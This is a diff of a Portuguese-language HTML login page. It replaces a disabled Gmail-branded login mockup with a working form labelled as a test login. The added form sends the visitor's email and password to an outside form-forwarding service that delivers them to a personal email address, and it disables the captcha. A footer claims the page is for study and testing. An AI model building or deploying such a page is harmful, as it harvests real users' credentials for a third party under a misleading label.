@@ -1,62 +1,97 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Gmail</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Simulado</title>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
-      font-family: 'Roboto', sans-serif;
-      background-color: #f1f1f1;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #4facfe, #00f2fe);
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
     }
-    .container {
-      background-color: white;
+
+    .form-box {
+      background-color: #fff;
       padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-      max-width: 350px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
       width: 100%;
+      max-width: 400px;
       text-align: center;
+      animation: fadeIn 0.8s ease-in-out;
     }
-    img {
-      width: 75px;
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
       margin-bottom: 20px;
+      color: #333;
     }
+
     input {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
+      padding: 14px;
+      margin: 10px 0 20px;
       border: 1px solid #ccc;
-      border-radius: 4px;
+      border-radius: 6px;
+      font-size: 15px;
+      transition: border-color 0.3s;
     }
+
+    input:focus {
+      border-color: #1a73e8;
+      outline: none;
+    }
+
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
-      color: white;
+      padding: 14px;
+      background: #1a73e8;
       border: none;
-      border-radius: 4px;
+      border-radius: 6px;
+      color: white;
       font-size: 16px;
-      margin-top: 20px;
+      font-weight: bold;
       cursor: pointer;
+      transition: background 0.3s;
     }
-    p {
-      font-size: 14px;
-      color: #555;
+
+    button:hover {
+      background: #1669c1;
+    }
+
+    .footer {
+      font-size: 13px;
+      color: #777;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" alt="Gmail">
-    <h2>Fazer login</h2>
-    <p>Use sua Conta do Google</p>
-    <input type="email" placeholder="E-mail ou telefone" disabled>
-    <input type="password" placeholder="Digite sua senha" disabled>
-    <button disabled>Avançar</button>
+
+  <div class="form-box">
+    <h2>Login de Teste</h2>
+    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+      <input type="email" name="email" placeholder="Digite seu e-mail" required />
+      <input type="password" name="senha" placeholder="Digite sua senha" required />
+      <input type="hidden" name="_captcha" value="false">
+      <button type="submit">Enviar</button>
+    </form>
+    <div class="footer">Formulário para fins de estudo e teste.</div>
   </div>
+
 </body>
 </html>
